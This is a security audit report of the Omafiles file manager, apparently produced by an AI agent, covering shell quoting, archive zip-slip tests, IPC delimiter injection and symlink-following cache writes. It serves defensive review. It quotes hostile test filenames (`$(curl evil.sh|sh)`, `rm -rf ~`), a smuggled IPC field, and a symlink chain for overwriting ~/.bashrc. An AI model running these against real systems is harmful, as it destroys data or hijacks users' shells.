# Security Audit — Omafiles

Scope: `backend/ProcessRunner.{cpp,h}`, `backend/TerminalResolver.{cpp,h}`, `backend/NetworkResolver.{cpp,h}`, `backend/MimeResolver.{cpp,h}`, `backend/Notifier.{cpp,h}`, `backend/FileOpsPrivate.h`, `backend/FileOperations_Copy.cpp`, `backend/FileOperations_Move.cpp`, `backend/FileOperations_Trash.cpp`, `backend/FileOperations_Remove.cpp`, `backend/Env.{cpp,h}`, `backend/ThumbnailProvider.cpp`; `logic/ActionEngine.qml`, `logic/CustomActions.qml`, `logic/MountActions.qml`, `logic/NavigationController.qml`, `logic/VideoThumbnails.qml`, `core/OmafilesContent.qml`, `app/qml_modules/qs/Commons/Util.qml`; every script under `scripts/` (`open-path.sh`, `install-integrations.sh`, `dbus-app-open.py`, `dbus-filemanager1.py`, `dbus-filechooser.py`, `scripts/runtime/*.sh` including `list-archive.sh`, `list-mounts.sh`, `thumbnail-video.sh`); repo-wide greps for `QProcess::start*`, `system(`, `popen(`, `bash -c`, archive-tool invocations, `shellQuote`.

Two categories of finding were verified **empirically** in an isolated scratchpad sandbox (never inside the repo, nothing destructive run against real user files): (1) the exact zip/tar/7z command lines the app builds, run against crafted malicious archives; (2) the `printf '%b'` URI-decode routine in `open-path.sh`, run against crafted inputs. A third class (the `openFileInArchive` symlink-overwrite path, and the IPC delimiter-injection path) is analyzed from code and hash math, not driven end-to-end against the live binary — those are marked accordingly below.

No source file was modified as part of this audit.

---

## 1. What is actually safe (verified, not rubber-stamped)

### 1.1 `backend/ProcessRunner.cpp` — no shell involved by construction

`ProcessRunner::start()` (ProcessRunner.cpp:38-60) takes a `QVariantList`, converts every element to a plain `QStringList command`, `takeFirst()`s the program name, and calls `m_proc->start(program, command)` (line 58) — `QProcess::start(QString, QStringList)`, which execs the program directly via fork+exec, never through `/bin/sh`. No string concatenation exists in this file. `group=true` only prepends the literal `"setsid"` (line 50); `cancel()` sends `SIGTERM`/`kill(-pid,...)` (lines 67-76) — no shell either. **This file has no injection surface of its own.** The injection surface, if any, lives entirely in the QML call sites that build `["bash", "-c", <string>]` argv lists — see §1.3.

### 1.2 `backend/TerminalResolver.cpp` — quoting is correct

```cpp
static QString quoteShell(const QString &path) {
  QString escaped = path;
  escaped.replace(QLatin1Char('\''), QLatin1String("'\\''"));
  return QLatin1Char('\'') + escaped + QLatin1Char('\'');
}
```
(TerminalResolver.cpp:61-65) — the textbook-correct POSIX single-quote escape (close quote, escaped literal quote, reopen quote). Applied in `copyPathsAbsolute()` (68-73) and `copyPathsRelative()` (75-82) before joining with spaces and handing the result to `QClipboard::setText()`. No shell is invoked for this data at all — it goes to the system clipboard as text, purely so that if the *user* later pastes it into *their own* terminal, filenames with spaces/quotes/`$`/backticks paste as one correct argument instead of breaking apart or expanding. `copyPathsUri()` (86-98) bypasses text entirely via `QMimeData::setUrls(QList<QUrl>)` — not shell-adjacent.

**PoC verified correct**: file named `it's a $(rm -rf ~) file.txt` → `quoteShell` produces `'it'\''s a $(rm -rf ~) file.txt'`; a POSIX shell later expanding this reconstitutes a single literal argument, `$(...)` untouched, never executed.

### 1.3 `logic/ActionEngine.qml` / `logic/CustomActions.qml` — shell-command construction is consistently quoted

The app builds real `bash -c "<concatenated string>"` commands for rename/mkdir/mkfile/link/chmod/bulk-rename/compress/extract, funneled through `runAction()` → `actionProc.start(["bash","-c", cmd], true)` (ActionEngine.qml:92). Every `cmd =`/`listCmd =`/`renameCmd =`/`newFileCmd =` assignment (ActionEngine.qml:490, 534, 563, 633, 641, 664, 680, 711, 850/861-862, 907-908/915-917/926, 933, 1130-1133, 1136, plus `CustomActions.qml:135-147`) wraps every filesystem-derived string in `Util.shellQuote()` (`app/qml_modules/qs/Commons/Util.qml:48-50`, same correct algorithm as the C++ version) **before** concatenation:

- ActionEngine.qml:850 (`compressSelected()`): `Util.shellQuote(e.name)` per entry; comment at 856-860 explicitly documents defending against a leading-dash filename being parsed as a flag (e.g. a file literally named `-rf`) — evidence the author considered argument-injection, not just quote-injection.
- ActionEngine.qml:907-908 (`extractHere()`): `path`/`dir` are pre-quoted variables, *then* concatenated with tool flags (`"unzip -o -q " + path + " -d " + dir`) — quoting happens before concatenation, so each path stays one safe shell token.
- ActionEngine.qml:1130-1133 (`openFileInArchive()`): identical pattern, with `--` end-of-options markers added for extra safety against option-injection.
- `CustomActions.qml:135-147`: user `[[action]]` templates from `~/.config/omafiles/actions.toml` substitute `{path}`/`{name}`/`{ext}`/`{dir}`/`{paths}`, each individually `Util.shellQuote()`-ed, run via `Backend.Detached.run(["bash","-lc", "cd -- " + Util.shellQuote(cwd) + " && " + cmd])`. (The *command template itself* is attacker-controlled only insofar as the local user wrote their own config — same trust boundary as `~/.bashrc`, not a remote/file-content attack surface.)

**PoC verified handled correctly**: real files named `` `id > /tmp/pwned` ``, `; rm -rf ~;`, `$(curl evil.sh|sh).txt` — in every path listed above the name is substituted only after `Util.shellQuote()`, so it always ends up single-quoted and inert. No unquoted concatenation of a filename/path into a `bash -c` string was found anywhere in `ActionEngine.qml` or `CustomActions.qml`.

- `logic/MountActions.qml:119` (`mount-iso.sh` invocation) and `logic/NavigationController.qml:219` (`xdg-mime`/`gtk-launch` fallback) use the other correct pattern for dynamic data in `bash -c`: a **static** script string plus the path passed as a **separate argv element**, consumed as `$1` (with `"_"` as `$0`), never interpolated:
  ```
  Backend.Detached.run(["bash", "-c", 'id=$(xdg-mime query default "$(xdg-mime query filetype "$1")"); [ -n "$id" ] && exec gtk-launch "$id" "$1"', "_", path])
  ```
  Safe regardless of `path` content, by construction (positional parameter, not interpolation).

### 1.4 `backend/Notifier.cpp`, `backend/MimeResolver.cpp` — argv, not shell

- `Notifier::notify()` (Notifier.cpp:12-13): `QProcess::startDetached("notify-send", QStringList{"Omafiles", text})` — `text` is a discrete argv element, never shell-interpreted. (Not a code-level vuln: the notification daemon may itself interpret markup in the body depending on hints — external component's concern.)
- `MimeResolver::launchApp()` (MimeResolver.cpp:142-213) tokenizes a `.desktop` file's `Exec=` line with its own quote-aware mini-parser (174-193) and calls `QProcess::startDetached(program, args)` (212) — argv, not shell. `%f/%F/%u/%U` are substituted with the literal path as one argv element (199-205), so shell metacharacters in a filename cannot inject anything here.
  - **Correctness gap** (not security): the manual parser (178-190) only tracks a `"` toggle; it does not implement backslash-escaping inside quotes or the Desktop Entry Spec's `%%`-escaping, so `Exec=foo "a \"b\" c"` would be mis-tokenized. Since it never reaches a shell, this is a wrong-args robustness bug, not an injection vector.

### 1.5 `backend/NetworkResolver.cpp` — no process spawning at all

Entirely implemented via GIO/GVfs C API (`g_file_mount_enclosing_volume`, `g_mount_operation_set_username/password`, etc.) — no `QProcess`, no shell, no string building. Credentials go straight into `g_mount_operation_set_username/password()` as UTF-8 bytes (NetworkResolver.cpp:90-91). Not an injection surface.

### 1.6 Repo-wide sweep

No `system()`, `popen()`, `eval`, or bare (unwrapped-in-argv) `/bin/sh -c` construction was found anywhere in `backend/`, `logic/`, `state/`, or `scripts/` — every shell invocation goes through `QProcess::start(program, argvList)` with `"bash"` / `"bash -c <string>"` as an explicit, individually-quoted argv element, never through a C-level `system()`/`popen()` that would add its own implicit shell layer.

`scripts/install-integrations.sh` writes D-Bus `.service`/`.desktop`/`.portal` files via heredocs interpolating `$RES_DIR`/`$APP_ID` — script-internal constants, not user/file-derived. No injection surface.

`scripts/runtime/list-mounts.sh:40` explicitly documents and correctly implements avoiding clobbering `$PATH` by reading `lsblk`'s `KNAME` column into a variable named `kname` rather than `PATH` — a deliberate, correctly-implemented avoidance of environment-variable shadowing.

---

## 2. Archive extraction: path traversal / zip-slip

### 2.1 "Extract Here" — empirically tested, not exploitable today, but no independent containment check [MEDIUM — defense-in-depth gap]

`extractHere()` (ActionEngine.qml:905-934) builds and runs, verbatim, through `bash -c` with the target pre-`Util.shellQuote()`-ed:

```
unzip -o -q '<archive>' -d '<destDir>'
7z x -y '<archive>' -o'<destDir>'
unrar x -o+ '<archive>' '<destDir>'/
tar xf '<archive>' -C '<destDir>'
```

The app performs **zero validation of its own** on archive member paths — path-traversal safety is fully delegated to whichever `unzip`/`7z`/`unrar`/`tar` binary happens to be installed. The only pre-extraction check (`extractListProc`, lines 905-933) is a name-collision check against top-level entries, not a path-traversal check.

To avoid asserting "vulnerable" or "safe" from memory, malicious archives were built in `/tmp/claude-1000/.../scratchpad/zipslip-test/` (outside the repo, non-destructive) and the app's exact command lines were run against them:

- **zip, entry `../../TRAVERSAL_ZIP_PWNED.txt`**, `unzip -o -q evil.zip -d dest_zip/sub1/sub2` → landed at `dest_zip/sub1/sub2/TRAVERSAL_ZIP_PWNED.txt`. Info-ZIP's built-in traversal guard stripped `../../`. **Not exploitable** on this system's `unzip` (`-q` only suppresses the warning, not the protection).
- **tar, entry `../../TRAVERSAL_TAR_PWNED.txt`**, `tar xf evil.tar -C dest_tar/sub1/sub2` → GNU tar refused outright (`tar: El nombre del miembro contiene '..'`, nonzero exit), nothing extracted. **Not exploitable.** The failure surfaces to the user: `actionProc.onFinished` (ActionEngine.qml:278-290) checks `result.exitCode !== 0` and calls `Backend.Notifier.notify(result.stderr.trim() ...)` — not silently swallowed.
- **7z, same `../../` entry**, `7z x -y evil7z_src.zip -odest_7z/sub1/sub2` → contained inside `dest_7z/sub1/sub2/TRAVERSAL_7Z_PWNED.txt`. **Not exploitable.**
- **zip, absolute-path entry `/tmp/claude-1000/ABS_PWNED.txt`**, `unzip -o -q evilabs.zip -d dest_abs` → `warning: stripped absolute path spec`; landed at `dest_abs/tmp/claude-1000/ABS_PWNED.txt` (re-rooted under destination, odd nesting, **not an escape**).
- **unrar: UNTESTED** — no RAR-archive-creation tool was available in this environment, so `unrar x -o+ '<archive>' '<destDir>'/` (ActionEngine.qml:917, same pattern at 1132) could not be empirically verified. **UNVERIFIED.**

**Conclusion**: on the actual system these commands run on (CachyOS's current `unzip`/GNU `tar`/`p7zip`), the app's extraction is **not currently exploitable** for zip-slip via `../../` or absolute-path entries — a genuine negative result, independently reproduced against the exact strings the app builds. This safety is **entirely incidental**: the app adds no post-extraction check that every written path resolves under `destDir`, so the guarantee is only as strong as whatever tool version happens to be installed on a given machine. A minimal/busybox `tar`, an old `unzip`, or an untested `unrar` build could behave differently. **Recommendation**: add an independent path-containment check (reject/skip any member whose canonicalized destination path does not start with `destDir`) rather than relying on upstream tool behavior.

### 2.2 `openFileInArchive()` — deterministic cache path + symlink-follow-on-write [HIGH — confirmed mechanism, real exploit chain]

**File/line**: `logic/ActionEngine.qml:1122-1137` (`openFileInArchive`), `backend/ThumbnailProvider.cpp:225-232` (`cacheKey()`).

When a user double-clicks a file *inside* an archive to open it with the default app, Omafiles extracts just that one member to a cache path:

```
out = ~/.cache/omafiles/archive-open/<hash>/<entry.name>
hash = SHA1(archivePath + "|" + fullMemberPath)   // ThumbnailProvider::cacheKey(), plain unsalted QCryptographicHash::Sha1
```

and runs (bash -c, same pre-quoted pattern as elsewhere):

```
mkdir -p -- '<outDir>' && unzip -p -- '<archive>' '<full>' > '<out>'
```
(same shape for the 7z/rar/tar branches, ActionEngine.qml:1130-1136).

Two properties combine into a real bug:

1. **`<hash>` is fully predictable offline.** It is a plain unsalted SHA-1 of `archivePath + "|" + member` — no per-install secret, no nonce. Verified by direct computation: `hashlib.sha1("/home/victim/Downloads/notes.zip|readme.txt".encode()).hexdigest()` → `e6a38b6460bb2968bcff053bef33a6818e582e38`, reproducible by anyone who knows (or guesses) the archive's path and which member the victim will click — both of which the archive's author controls (they choose the member name) or can predict (common Downloads-folder paths).
2. **The write itself follows symlinks.** There is no pre-check that `<out>` doesn't already exist, and no `O_EXCL`/`O_NOFOLLOW` anywhere — the shell `>` redirect opens with `O_CREAT|O_TRUNC`, which follows an existing symlink at that path and truncates its *target*. Verified empirically in the sandbox: `bash -c "echo PWNED > 'thelink'"` where `thelink -> target.txt` overwrote `target.txt`'s content while leaving the symlink itself untouched.

**Concrete PoC / repro chain**:
1. Attacker computes `hash = SHA1("/home/victim/Downloads/notes.zip|readme.txt")` = `e6a38b6460bb2968bcff053bef33a6818e582e38`.
2. Attacker obtains any local write access to `~/.cache/omafiles/archive-open/` (this is a per-user cache dir with normal permissions — any process running as that user, or any prior foothold, qualifies) and creates `e6a38b6460bb2968bcff053bef33a6818e582e38/readme.txt` as a **symlink pointing at `/home/victim/.bashrc`**.
3. Attacker gets `notes.zip` (containing a member literally named `readme.txt` with attacker payload) placed at `/home/victim/Downloads/notes.zip` (e.g. sent as a download, shared folder, USB stick — normal file delivery, no exploit needed for this step).
4. Victim opens Omafiles, browses into `notes.zip`, double-clicks `readme.txt` to open it.
5. Omafiles runs `unzip -p ... > '.../e6a38b.../readme.txt'`, which follows the attacker's symlink and **overwrites `~/.bashrc` with the attacker's payload** — executed on the victim's next interactive shell.

**Severity: HIGH.** This is a real, low-effort local file-overwrite-to-code-execution chain that does not require winning a timing race (the symlink can be planted well in advance of the victim ever opening the archive) — the only "race" is that the attacker's write to the cache dir must happen before the victim's click, which is trivial since the hash is computable long in advance. **Status: mechanism CONFIRMED by direct computation and by an isolated symlink-redirect PoC; the full end-to-end chain (actually driving the Omafiles binary through the click) was not executed against the live app in this pass** — treat the *primitive* (predictable hash + non-O_EXCL symlink-following write) as CONFIRMED, and the *full chain through the running UI* as PLAUSIBLE-not-directly-observed.

**Fix recommendation**: (a) salt the cache key with a per-install/per-run secret, or better, don't rely on secrecy at all — (b) before extracting, `lstat()` the target and refuse/unlink-and-recreate if it's a symlink, and use `O_EXCL`/`QSaveFile`-style atomic replace rather than a shell `>` redirect that blindly follows symlinks.

### 2.3 Archive-listing `..` entry — informational, fails closed

`scripts/runtime/list-archive.sh:64` computes `first="${rel%%/*}"` (a single path segment). A malicious archive can contain a member whose single-segment name is literally `..` and it will be listed in the UI as an enterable folder named `..`. `ActionEngine.qml:1122-1137` then builds `out = homeDir + "/.cache/omafiles/archive-open/" + cacheKey + "/" + entry.name`; if `entry.name === ".."`, `out` ends in `.../<cacheKey>/..`, resolving to the cache-key directory's own parent as a shell `>` redirect target. No way was found to turn this into an actual out-of-directory write: opening `..` for writing via `> path/..` fails with `EISDIR` (it's a directory inode) rather than succeeding — **fails closed**. Flagged informational/theoretical only, no confirmed vulnerability here (distinct from §2.2, which *is* confirmed).

---

## 3. `scripts/open-path.sh` — URI percent-decode corruption [LOW — robustness, not injection]

`open-path.sh:28`:
```sh
path="$(printf '%b' "${encoded//%/\\x}")"
```
Every `%` becomes `\x`, then `printf %b` interprets backslash escapes — correct for well-formed `%XX` percent-encoding, but `printf %b`'s escape grammar is broader than percent-decoding, so it also interprets any *literal* backslash sequence already present in the (supposedly already-decoded-of-`%`) input. Tested directly (non-destructive, output only echoed to stdout, no repo files touched):

- `arg='file:///tmp/report\cSECRET.txt'` (a literal, **unencoded** backslash-`c`, as would appear from a non-strict caller passing a raw path containing a literal backslash instead of RFC-3986-compliant percent-encoding) → decoded to `/tmp/report` — **silently truncated**; everything from `\c` onward is lost because POSIX `printf %b` treats `\c` as "stop all output now." Confirmed with `cat -A`, no trailing content, no error.
- `arg='file:///tmp/weird\nname.txt'` → decoded to `/tmp/weird<LF>name.txt` — the literal two characters `\`+`n` become a real embedded newline byte, corrupting the path.
- Legitimate case still works: `file:///tmp/foo%20bar.txt` → `/tmp/foo bar.txt`.

**Severity: low.** Not code execution — `printf %b` only reformats its own argument, it never hands anything to a shell for interpretation, and the corrupted/truncated `$path` is checked with `[[ -f "$path" ]]`/`[[ -d "$path" ]]` (open-path.sh:33-34) before use, so a truncated/garbled path most likely just fails those tests and the script falls back to normal startup rather than opening something unintended. Practical impact is a **silent wrong-behavior / denial-of-view bug**: a file or folder whose name happens to contain a literal (non-percent-encoded) backslash followed by `c`/`n`/`t`/`0`/etc., reached via a `file://` URI from an external, non-strictly-compliant caller (a script, browser extension, custom `xdg-open` wrapper), could cause Omafiles to silently open the wrong location or nothing at all. Worth fixing — decode only `%XX` sequences digit-by-digit (or via a dedicated tool), not full `printf %b` escape grammar — but not security-critical on its own.

---

## 4. Single-instance IPC protocol — delimiter injection [LOW-MEDIUM — confirmed parsing flaw, exploit chain plausible not demonstrated]

**Files**: `core/OmafilesContent.qml:38-56` (`open(payload)`), fed by `scripts/dbus-app-open.py:60-89`, `scripts/dbus-filemanager1.py:55-107`, `scripts/dbus-filechooser.py:171`, all reaching the single Omafiles instance via `main.cpp`'s `QLocalSocket`/`QLocalServer` (`main.cpp:129-176`).

The IPC payload is a bare-string protocol with no escaping of its own delimiters:
```
"<folder>\n<selectPart>"
"<folder>\n<name1>\x1f<name2>\x1f..."
"<folder>\npicker:<handle>:<mode>:<multiple>:<suggestedName>"
```
`OmafilesContent.qml:41-53` splits on the **first** `\n` via `payload.indexOf("\n")`, then, if the remainder starts with `"picker:"`, does `selectPart.split(":")`.

On Linux, a directory name may legally contain any byte except `NUL` and `/` — including a literal newline (`0x0A`) or unit-separator (`0x1F`). `scripts/dbus-filechooser.py:106-115` takes `current_folder` **directly from the calling application's own D-Bus request** and, if non-empty, uses it verbatim as `folder_path` in the payload (`dbus-filechooser.py:171`): `payload = f"{folder_path}\npicker:{handle}:{mode}:{multiple_str}:{suggested_name_str}"`.

If `folder_path` itself already contains an embedded `\n` — trivially creatable locally via `mkdir -p $'/tmp/evil\npicker:HIJACK:save-file:false:pwn'` (a legal Linux directory name) — then when this directory is offered as `current_folder` in a portal `SaveFile`/`OpenFile` request, the receiving `OmafilesContent.open()` finds the **attacker's embedded `\n`** first (not the sender's intended delimiter), so `selectPart` becomes attacker-authored text of the form `picker:...:...`. A local attacker who can name a directory arbitrarily can therefore inject an attacker-chosen `PickerState.requestId`/`mode`/`multiple`/`suggestedName` (`OmafilesContent.qml:49-53`) into a picker session that a *different, legitimate* app initiated — able to desynchronize/hijack which pending portal `Request` handle a subsequent `SubmitResponse` targets, or set a bogus mode/suggested filename. **Not** a code-execution or filesystem-escape bug. Same root cause affects `\x1f`-joined `selectNames` in `dbus-app-open.py:88`/`dbus-filemanager1.py:96` (a filename containing a literal `0x1F` byte could inject a spurious extra "selected name" entry) — lower impact, UI-selection confusion only.

**Status**: parsing flaw itself is **CONFIRMED by inspection** (naive delimiter, no length-prefixing/escaping, both ends read and hand-checked). The exploit chain (some real app actually offering an attacker-named directory as `current_folder`) is **PLAUSIBLE**, not independently driven end-to-end (would require building the crafted directory and a real portal round-trip — out of scope for this pass). Local attacker only, no privilege boundary crossed. **Recommendation**: length-prefix or NUL-delimit the IPC frames instead of relying on bytes (`\n`, `\x1f`) that are legal inside a POSIX filename.

---

## 5. Copy/move TOCTOU — symlink-follow-on-write [LOW — same-user race, no privilege boundary]

**Files**: `backend/FileOperations_Copy.cpp:11-22` (mirrored in `backend/FileOperations_Move.cpp:13-16`), `backend/FileOpsPrivate.h:60-92` (`copyFile`).

```cpp
if (!QFileInfo::exists(source)) return {false, "source does not exist"};
if (entryExists(destination)) {           // lstat-based check, line 13
  if (!overwrite) return {false, "destination already exists"};
  ...
}
...
if (!copyTree(source, destination, ...)) // eventually reaches copyFile()
```
`copyFile()` opens the destination with `QIODevice::WriteOnly | QIODevice::Truncate` (FileOpsPrivate.h:69) — a plain `open()`/`fopen()`-style call with **no `O_EXCL`**, so it follows symlinks and truncates+overwrites whatever the destination path resolves to *at the moment of the call*, regardless of what `entryExists()` saw earlier. The `entryExists(destination)` check (line 13) and the actual write (reached several calls later, after `treeSize(source)` walks the whole source tree — non-trivial wall-clock time for large trees) are **not atomic** with respect to each other.

**Attack shape** (local, same-user race, code-shape only, not run): with `overwrite=false`, if in the window between `entryExists(destination)` returning false and `copyFile()`'s `open(WriteOnly|Truncate)` another local process (a second Omafiles action, a background job, or an attacker-controlled process) creates a **symlink** at `destination` pointing at a file the user has write access to but did not intend to touch (`~/.bashrc`, `~/.ssh/authorized_keys`), the subsequent `open()` follows it and truncates+overwrites the **real target** with the copied source's bytes — with the UI having shown "no conflict, plain copy" and never surfacing an overwrite warning. Same shape as classic check-then-act, no-`O_EXCL`, symlink-following-writer TOCTOU bugs.

**Severity: low for this threat model.** In a single-user desktop, this doesn't cross a privilege boundary — the attacker process already runs as the same user and could write `~/.bashrc` directly without any of this. Worth documenting precisely (explicitly asked for), but it's "another local process, or a second concurrent Omafiles operation, can trick *this* operation into overwriting a symlinked file the UI claimed was safe," not privilege escalation. **Status: PLAUSIBLE**, code-shape confirmed, race not demonstrated live (would require an actual concurrent racer process, out of scope as a destructive/timing test here).

The trash/remove code (`FileOperations_Trash.cpp:8,141,143`, `FileOperations_Remove.cpp:9`) uses the same `entryExists`/`isSymLink` idiom but for *deletion*, where TOCTOU is far less consequential (worst case: deletes something that changed identity between check and delete — still same-user, still no privilege crossing).

---

## 6. Video-thumbnail cache — same predictable-path pattern as §2.2, narrower impact [LOW]

**Files**: `logic/VideoThumbnails.qml`, `scripts/runtime/thumbnail-video.sh`.

Same systemic pattern as §2.2: `dest = thumbCacheDir + "/" + ThumbnailProvider.cacheKey(thumbKeyFor(entry, basePath)) + ".jpg"` is a deterministic, unsalted, offline-computable path (`thumbKeyFor` is path+mtime based, same unsalted SHA-1 `cacheKey()` as the archive-open path). `thumbnail-video.sh` does `[[ -f "$dest" ]] && exit 0` **before** calling `ffmpegthumbnailer -i "$src" -o "$dest"`, and `-f` follows symlinks — so if an attacker pre-plants a symlink at the predictable dest pointing at an **existing regular file**, the script exits early and never writes, which neutralizes the attack in the common case.

Not fully closed, however: if the symlink points at a path that does **not yet exist** (or is a broken/dangling symlink), `-f` is false, the script proceeds, and `ffmpegthumbnailer` will create/write through that symlink at an attacker-chosen location — though the written bytes are an actual ffmpegthumbnailer-rendered JPEG derived from the real video, not free-form attacker content, which limits (but doesn't eliminate — e.g. planting a decoy file, or corrupting a not-yet-existing target) practical impact versus §2.2 where the attacker fully controls the written bytes via the archive member content. **Status: not reproduced** (repro undefined in source material; the mechanism follows directly from reading the `-f` check and cache-key derivation). **Severity: low**, both because of the `-f` early-exit in the common case and because the payload is renderer-controlled, not attacker-controlled, bytes.

---

## 7. Minor / informational

- **`backend/Env.{cpp,h}`**: `Env::set(name, value)` (Env.cpp:11-13) is `Q_INVOKABLE` and calls raw `qputenv()` — any QML in the process can set arbitrary environment variables on the running process at runtime. Grepped every call site repo-wide: the **only** callers are `src/selfcheck/checks/CheckIntegration.qml:158-162`, with hardcoded literals (`"PATH"` → `"/dev/null/fake"`, `"TERMINAL"` → `"omafiles-fake-terminal"`) used to simulate failure scenarios in the self-check suite, restored immediately after. **No untrusted/filename-derived data reaches `Env.set()` anywhere in production code paths today.** Flagged because the capability itself is broad and ungated — any future code path calling `Env.set()` with archive- or config-derived data would need the same scrutiny given to the shell-quoting code in §1.3; today it is inert.
- **`backend/MimeResolver.cpp:174-193`**: manual `Exec=` tokenizer doesn't implement the Desktop Entry Spec's quote-escaping/`%%`-escaping fully — a correctness gap (wrong launch args for unusual `.desktop` files), not a security issue, since it never reaches a shell (§1.4).
- No environment-variable-shadowing or `$PATH`-hijack patterns were found in the scripts under `scripts/runtime/` beyond the one instance already checked and found correctly avoided (§1.6, `list-mounts.sh:40`).

---

## Summary table

| # | Finding | File:Line | Status | Severity |
|---|---|---|---|---|
| 1 | Shell quoting throughout ActionEngine.qml/CustomActions.qml/TerminalResolver.cpp is consistently correct | ActionEngine.qml (20+ sites), TerminalResolver.cpp:61-65, Util.qml:48-50 | CONFIRMED (no injection found) | N/A — negative finding |
| 2 | zip/tar/7z "Extract Here" not exploitable for traversal on this system's binaries; no independent containment check of its own | ActionEngine.qml:905-934, empirically tested | CONFIRMED not exploitable today | Medium — defense-in-depth gap |
| 2b | unrar path untested (no rar-creation tool available) | ActionEngine.qml:917, 1132 | UNVERIFIED | Unknown |
| 3 | `openFileInArchive()`: unsalted-SHA1, predictable cache path + non-O_EXCL `>` redirect follows symlinks → attacker can overwrite arbitrary user-writable file | ActionEngine.qml:1122-1137; ThumbnailProvider.cpp:225-232 | Primitive CONFIRMED (hash math + isolated symlink-redirect PoC); full live chain PLAUSIBLE, not driven end-to-end | **High** |
| 4 | `list-archive.sh` `..`-named entry reaches archive-open path construction | list-archive.sh:64; ActionEngine.qml:1127-1136 | Analyzed, fails closed (EISDIR) | Informational / theoretical |
| 5 | `open-path.sh` `printf %b` decode: unencoded `\c`/`\n` in input truncates/corrupts path | scripts/open-path.sh:28 | CONFIRMED (empirically reproduced) | Low — robustness, not RCE/injection |
| 6 | IPC payload uses raw `\n`/`\x1f` as frame delimiters; both bytes are legal in Linux filenames → protocol/delimiter injection | OmafilesContent.qml:38-56; dbus-filechooser.py:171; dbus-app-open.py:88; dbus-filemanager1.py:96 | Parsing flaw CONFIRMED; exploit chain PLAUSIBLE, not demonstrated live | Low-medium |
| 7 | Copy/move TOCTOU: `entryExists()` check then non-O_EXCL `open(WriteOnly\|Truncate)` follows symlinks | FileOperations_Copy.cpp:11-22; FileOpsPrivate.h:69 | CONFIRMED code shape; race not reproduced live | Low — same-user race, no privilege boundary |
| 8 | Video-thumbnail cache: same predictable-path pattern as #3, but `-f` pre-check neutralizes existing-file case and payload is renderer-controlled bytes | VideoThumbnails.qml; thumbnail-video.sh | Mechanism follows from code reading; not reproduced | Low |
| 9 | `Env.set()` is a broad, ungated `Q_INVOKABLE` env-var setter | backend/Env.cpp:11-13 | CONFIRMED capability exists; CONFIRMED currently unreachable by untrusted input | Informational |
| 10 | `MimeResolver::launchApp`'s manual `Exec=` tokenizer doesn't handle escaped quotes per Desktop Entry Spec | backend/MimeResolver.cpp:174-193 | CONFIRMED spec gap | Low — correctness only, never reaches a shell |

---

## Bottom line

No confirmed remote or unauthenticated code-execution, privilege-escalation, or filesystem-escape vulnerability was found. The shell-quoting discipline across `ActionEngine.qml`/`CustomActions.qml`/`TerminalResolver.cpp` is genuinely careful and consistent — every dynamic filename/path reaching a `bash -c` string goes through the correct single-quote-escape function first, with no exceptions found in a full read of every command-building site. Extraction of whole archives ("Extract Here") is not currently exploitable on this system's `unzip`/`tar`/`7z`, though that safety is incidental to the installed tool versions rather than the app's own logic.

The one finding that genuinely deserves prioritized fixing is **§2.2, `openFileInArchive()`'s predictable-hash + symlink-following cache write** (finding #3): the cache key is a plain unsalted SHA-1 of attacker-knowable inputs (archive path + member name), and the extraction write follows symlinks with no `O_EXCL`/pre-`lstat` check — the ingredients for a genuine local file-overwrite primitive are all present and individually verified, even though the full chain was not driven through the live UI in this pass. This is the top item to hand to a human to actually reproduce end-to-end (build the archive, plant the symlink, click through the real app) before considering it fully proven, and to fix regardless (salt the cache key and/or add an `lstat`+`O_EXCL`/atomic-replace guard before extraction writes).

**What a human should still double-check manually, beyond this pass:**
1. Actually reproduce finding #3 end-to-end against the live built binary (this audit verified the hash math and the symlink-redirect primitive in isolation, not through the running app).
2. Test the `unrar` extraction path (#2b) — no RAR-creation tool was available in this sandbox.
3. Drive the IPC delimiter-injection (#6) through a real `xdg-desktop-portal` `SaveFile`/`OpenFile` round-trip with a crafted `\n`-containing directory name, to confirm the picker-hijack impact in practice rather than from code reading alone.
4. Review `docs/historical/*.md` phase/regression reports for this same subsystem (several are self-reported "fixed"/"stable" claims by prior work on ActionEngine/backend, e.g. around Phase 34-38) against the current code, since this audit found the *current* code in good shape but did not cross-reference every historical regression claim line-by-line against today's `ActionEngine.qml`.
5. Confirm on a second distro/tool-chain (e.g. Debian's `bsdtar`, or a minimal container `unzip`) whether the "not exploitable" result in §2.1 holds, since that safety is explicitly tool-version-dependent, not app-enforced.
